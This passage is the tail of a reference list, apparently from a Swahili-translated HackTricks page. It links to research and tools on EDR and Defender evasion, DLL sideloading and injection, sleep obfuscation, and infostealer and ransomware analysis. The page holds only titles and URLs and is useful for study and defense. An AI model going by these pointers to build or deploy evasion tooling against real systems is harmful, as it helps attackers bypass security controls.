- [9] [Draugr – PIC ya kudanganya call-stack](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Mnyororo Mpya wa Maambukizi na Obfuscation ya ConfuserEx kwa DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Je, unapaswa kuamini zero trust yako? Kukwepa ukaguzi wa posture wa Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Kabla ya ToolShell: Kuchunguza Operesheni za Awali za Ransomware za Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Kutumia Vibaya Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Orodha ya Forwarded Exports za Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Mpangilio wa utafutaji wa dynamic-link library](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Usalama wa michakato na haki za ufikiaji](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – Rejeleo la EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Kizindua cha CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Kukabiliana na EDRs kwa Usaidizi wa Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Kuvunja Ganda la Ulinzi la Windows Defender kwa Mbinu ya Kuelekeza Upya Folda](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Rejeleo la amri ya mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Chini ya Pazia Safi: Kutoka RAT hadi Builder hadi Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer Inakuja Mjini: Infostealer Mpya, Kabambe](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Kusimbua Usimbaji Fiche wa Chrome App Bound](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Kushinda Malware ya Node.js kwa Ufuatiliaji wa API](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Mrembo Aliyelala: Kuilaza Adaptix kwa Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Uharibifu wa Vigezo vya Mchakato](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Mrembo Aliyelala II: CFG, CET, na Udanganyifu wa Stack](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ufichaji wa usingizi wa Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Kuficha Dotnet Etw Yako](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Kutumia Vibaya Chrome Remote Desktop katika Operesheni za Red Team: Mwongozo wa Vitendo](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Kugeuza Driver ya Urekebishaji ya Defender kuwa Primitive ya Operesheni za Kernel](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Msimbo mwenza wa MDSec Function Peekaboo](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: Kuunda Functions Zinazojificha Zenyewe kwa Kutumia LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [Msimbo chanzo wa TwoSevenOneT - InjectSetConsole](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - Function ya CreatePipe](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Kuunda Child Process yenye Input na Output Zilizoelekezwa Upya](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - GhostPack Necromancy: Kuunda Upya Zana za C# kwa WasmForge](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - Kukompaili Miradi ya C# / .NET](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [DLLParty proof-of-concept na msimbo chanzo](https://github.com/epersic/DLLParty)
- [47] [DLLParty — Kutumia Vibaya Mambo ya Ndani ya Thread Pool kwa DLL injection isiyotumia shellcode](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
{{#include ../banners/hacktricks-training.md}}
